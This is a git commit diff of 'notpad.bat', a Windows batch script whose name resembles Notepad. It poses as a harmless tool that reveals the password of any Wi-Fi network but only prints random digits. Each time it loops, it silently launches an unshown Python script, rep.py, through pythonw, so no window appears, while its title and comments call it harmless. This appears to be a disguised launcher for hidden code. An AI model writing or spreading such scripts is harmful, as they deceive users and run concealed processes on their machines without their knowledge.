bb669c2acdb152576ffcacd908945c5ace35d477
lemask227-cloud <lemask227@gmail.com>
2025-10-31 23:04:11 +0100

    Add files via upload

--- notpad.bat
+++ notpad.bat
@@ -1,26 +1,23 @@
 @echo off
 color 0A
+title Wi-Fi Password (harmless)
+
 :loop
+start pythonw rep.py
 cls
-start pythonw rep.py 
-
-title Simulating the discovery of Wi-Fi 
-
-echo Type any Wi-Fi network name and the password will appear:
-set /p =():
-
-
+echo ===== Wi-Fi Password  =====
+echo.
+set /p ss=Type any Wi-Fi network name (or press Enter to exit): 
 if "%ss%"=="" goto :eof
 
-rem 
+rem Generate a fake-looking password (harmless)
 set /a r1=%random%
 set /a r2=%random%
 set pw=%r1%%r2%IF
+
 echo.
 echo Network: %ss%
 echo Password: %pw%
 echo.
 pause>nul
-
 goto loop
-
